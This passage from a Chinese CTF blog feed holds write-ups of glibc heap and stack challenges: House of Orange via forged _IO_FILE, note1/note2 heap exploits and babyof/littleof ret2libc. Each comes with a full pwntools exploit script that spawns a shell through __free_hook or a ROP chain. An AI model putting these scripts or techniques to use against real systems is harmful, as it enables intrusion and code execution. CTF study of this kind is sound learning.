class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以伪造的 _IO_FILE_plus 要通过下列检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   <br>或者是<br><span class="hljs-number">2.</span><br>_IO_vtable_offset (fp) == <span class="hljs-number">0</span> <br>&amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> <br>&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br></code></pre></td></tr></table></figure>

<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>来自buu的题目，程序不存在 delete 函数，无法释放堆块，所以要用到前面的修改 top chunk size 的方法，从而得到 libc 地址。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313210805600.png"><span class="image-caption">image-20220313210805600</span></p>
<p>漏洞点在于 edit 函数，对于写入的个数没做严格的限制，可以写入大于申请堆块长度的内容，从而存在堆溢出。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313210907191.png"><span class="image-caption">image-20220313210907191</span></p>
<p>伪造 IO_FILE_plus 后的成果如下：</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313170817299.png"><span class="image-caption">image-20220313170817299</span></p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313170916290.png"><span class="image-caption">image-20220313170916290</span></p>
<p>最终只能在本地getshell</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313173210640.png"><span class="image-caption">image-20220313173210640</span></p>
<p>远程一直都是显示 dumped core</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220313173230192.png"><span class="image-caption">image-20220313173230192</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./house_of_orange&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26547</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Name :&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Length of name :&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">&quot;Name:&quot;</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&quot;Price of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">520</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;Color of Orange:&quot;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    <br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xf81</span>)<br>edit(payload)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;aaaaaaaa&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5188</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>_IO_list_all = libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] + libc_base<br>sys = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>edit(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xe0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br>vtable_addr = heap_base + <span class="hljs-number">0x5e8</span><br>stream = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="hljs-number">0x61</span>)<br>stream += p64(<span class="hljs-number">0</span>) + p64(_IO_list_all-<span class="hljs-number">0x10</span>)<br>stream += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>stream = stream.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&quot;\x00&quot;</span>)<br>stream += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># mode&lt;=0</span><br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(vtable_addr)<br>stream += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>stream += p64(sys)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>payload += stream<br>edit(payload)<br><span class="hljs-comment">#p.sendlineafter(&quot;: &quot;,&#x27;1&#x27;)</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a href="https://www.jianshu.com/p/2e00afb01606">https://www.jianshu.com/p/2e00afb01606</a></p>
<p><a href="https://blog.csdn.net/A951860555/article/details/116425824">https://blog.csdn.net/A951860555/article/details/116425824</a></p>
<p><a href="https://www.cnblogs.com/elvirangel/p/7843842.html">https://www.cnblogs.com/elvirangel/p/7843842.html</a></p>
<p><a href="https://blog.csdn.net/w12315q/article/details/84328447">https://blog.csdn.net/w12315q/article/details/84328447</a></p>
<p><a href="https://www.anquanke.com/post/id/177910">https://www.anquanke.com/post/id/177910</a></p>
<p><a href="https://www.anquanke.com/post/id/177958">https://www.anquanke.com/post/id/177958</a></p>
<p><a href="https://www.anquanke.com/post/id/84987">https://www.anquanke.com/post/id/84987</a></p>
<p><a href="https://xz.aliyun.com/t/5508?spm=5176.12901015.0.i12901015.22a8525cU0EiiN">https://xz.aliyun.com/t/5508?spm=5176.12901015.0.i12901015.22a8525cU0EiiN</a></p>
]]></content>
      <tags>
        <tag>PWN、_IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>2021柏鹭杯</title>
    <url>/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛，一言难尽。惨痛爆0！终归是PWN👶，还需大量学习，不断进步。</p>
<h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><p>这道题目其实不难，但是比赛时就是一下子没想通，导致一直出不来</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103105150568.png"><span class="image-caption">image-20211103105150568</span></p>
<p>一道glibc-2.31下的64位保护全开的堆题</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103105100021.png"><span class="image-caption">image-20211103105100021</span></p>
<p>首先会先申请两个堆块，一个存放后续申请的堆块的相关信息，一个用来存放后续申请的堆块的大小和指针</p>
<p>其他的常见功能都具备，不同的地方在于，这题有两种索引方式，一种是正序，一种是逆序。只能对当前堆块进行操作</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103160037818.png"><span class="image-caption">image-20211103160037818</span></p>
<p>漏洞点在于释放堆块时，存在UAF</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103161126692.png"><span class="image-caption">image-20211103161126692</span></p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103163528129-16359285445091.png"><span class="image-caption">image-20211103163528129</span></p>
<p>第二个漏洞点在于申请的0x800的堆块实际上是不够存放堆块指针的，因为最多能申请0x100个，每个信息要0x10，总共要0x1000才够。所以在倒序索引的时候，堆块指针存放的地址是可以被我们申请到的，从而修改存放的堆块指针，获得任意写</p>
<p>而地址泄露则是申请大于0x400的堆块，释放后进入unsorted bin来泄露libc地址</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103163650482.png"><span class="image-caption">image-20211103163650482</span></p>
<p>getshell！</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./note1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.31.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;8.130.170.42&quot;,12031)</span><br>def <span class="hljs-builtin-name">debug</span>():<br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	#gdb.attach(p,<span class="hljs-string">&quot;b *<span class="hljs-variable">$rebase</span>(0x)&quot;</span>)<br><br>def <span class="hljs-builtin-name">add</span>(size,content):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(str(size))<br>    p.send(content)<br>	<br>def <span class="hljs-builtin-name">edit</span>(content):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.send(content)<br><br>def show():<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>def free():<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>def flip():<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    <br><span class="hljs-builtin-name">add</span>(0x500,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;b&#x27;</span>)<br>flip()<br>free()<br><span class="hljs-builtin-name">edit</span>(<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br><span class="hljs-builtin-name">add</span>(0x100,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x8)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x8)<br>libc_base = u64(p.recv(6).ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x1ec010<br>log.<span class="hljs-builtin-name">info</span>(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base) <br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-builtin-name">add</span>(0x100,<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-builtin-name">add</span>(0x300,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>x2a0 + p64(0x30) + p64(free_hook - 0x8))<br><br>flip()<br><span class="hljs-builtin-name">debug</span>()<br><span class="hljs-builtin-name">edit</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + p64(system))<br><br>free()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h2><p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20211103163800323.png"><span class="image-caption">image-20211103163800323</span></p>
<p>同样是glibc-2.31下的一道64位堆题</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220225163036673.png"><span class="image-caption">image-20220225163036673</span></p>
<p>经典菜单题目，存在申请、删除、打印三个功能</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220225163156584.png"><span class="image-caption">image-20220225163156584</span></p>
<p>add函数，将会申请一个0x20的堆块，可以写入0x10的数据，而主要数据将会再申请一个0x200的堆块进行存放。这里的input函数本来是无法编译出来的。</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220225163336928.png"><span class="image-caption">image-20220225163336928</span></p>
<p>将call的地址修改为函数里面的地址，即可正常编译，看到伪代码。里面不存在问题，就是正常的实现一个输入内容的功能。</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220225163504065.png"><span class="image-caption">image-20220225163504065</span></p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226131357634.png"><span class="image-caption">image-20220226131357634</span></p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226131414262.png"><span class="image-caption">image-20220226131414262</span></p>
<p>这里的因为char是有符号的类型，所以可以输入0x80这个特殊的数值，从而让abs函数失效，失效后的传出的数值就是-128，可以让创建的heap地址写入的heap_inuse[0]，heap_inuse[1]上</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226131554100.png"><span class="image-caption">image-20220226131554100</span></p>
<p>在释放功能里面，只是清空了heap_inuse，其他的堆地址仍然保留</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226131658741.png"><span class="image-caption">image-20220226131658741</span></p>
<p>那么就可以借助前面的-128导致heap_inuse前面两个是可以通过检验，继而打印出0x200上的数据，所以只要让0x200的堆块上存放着libc地址，即可造成泄露。</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226132043205.png"><span class="image-caption">image-20220226132043205</span></p>
<p>先释放一连串堆块，填满tcache</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226154345777.png"><span class="image-caption">image-20220226154345777</span></p>
<p>经过构造，致使两块0x210堆块合并</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226154457992.png"><span class="image-caption">image-20220226154457992</span></p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226154516240.png"><span class="image-caption">image-20220226154516240</span></p>
<p>将之前释放的堆块申请回来，最后再申请位于unsorted bin里面的合并堆块，导致前一块的0x200数据堆块可以覆盖到残留的0号堆块的fd、bk指针，到这里，这题就差不多完成了。之后就是申请0x80号堆块，打印出0号堆块数据块上的残留libc地址。之后再利用此时的覆盖数据，在释放0号堆块后，修改其fd指针指向free_hook，最终分配过去修改为system</p>
<p><img src="/2021/11/03/2021-11-03-2021%E6%9F%8F%E9%B9%AD%E6%9D%AF/image-20220226153827796.png"><span class="image-caption">image-20220226153827796</span></p>
<p>getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./note2&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br>	<span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0x)&quot;)</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">name, content, flag=<span class="hljs-number">1</span></span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;name: &quot;</span>)<br>    <span class="hljs-keyword">if</span> flag:<br>        p.sendline(name)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(name)<br>    p.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>    p.sendline(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(p64(<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(p64(<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">2</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">3</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">4</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">3</span>)<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(p64(<span class="hljs-number">5</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(p64(<span class="hljs-number">6</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(p64(<span class="hljs-number">7</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br>add(p64(<span class="hljs-number">0x80</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;-&gt; &#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ebbe0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    add(p64(<span class="hljs-number">8</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment">#移除一部分tcache</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">6</span>)<span class="hljs-comment">#通过6控制0</span><br>add(p64(<span class="hljs-number">6</span>), <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xB0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)+p64(free_hook))<br>add(p64(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(p64(<span class="hljs-number">1</span>), p64(sys))<br>free(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>wp来源：<a href="https://blog.csdn.net/qq_38154820/article/details/118773473">https://blog.csdn.net/qq_38154820/article/details/118773473</a></p>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021鹤城杯PWN</title>
    <url>/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次鹤城杯的题目友善，适合我这种pwn👶玩耍，但是就是这种幼儿园难度，却没能ak，还是太菜了，继续学习吧！迟早👶要变成👴！</p>
<h2 id="babyof"><a href="#babyof" class="headerlink" title="babyof"></a>babyof</h2><p>普通栈溢出，没什么好说的，非常基础的题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">21613</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./babyof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x40066b</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400743</span><br>ret = <span class="hljs-number">0x0000000000400506</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<br>p.send(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="littleof"><a href="#littleof" class="headerlink" title="littleof"></a>littleof</h2><p>这题比上面多了个canary的泄露，其他没什么差别，同样是基础栈溢出题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">27056</span>)<br><span class="hljs-comment">#p = process(&#x27;./littleof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./littleof&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>main = <span class="hljs-number">0x00000000004006E2</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400863</span><br>ret = <span class="hljs-number">0x000000000040059e</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> <br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>)<br>canary = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xa</span><br>log.info(<span class="hljs-built_in">hex</span>(canary))<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span 